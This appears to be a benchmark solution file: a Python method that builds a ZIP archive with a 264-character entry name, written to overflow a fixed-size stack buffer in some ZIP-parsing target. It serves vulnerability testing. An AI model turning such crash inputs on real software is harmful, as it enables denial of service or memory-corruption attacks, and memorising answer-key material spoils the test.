import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf = io.BytesIO()
        # Filename > 256 bytes to trigger the vulnerable fixed-size stack buffer
        long_name = "A" * 260 + ".obj"
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(long_name, b"data")
        return buf.getvalue()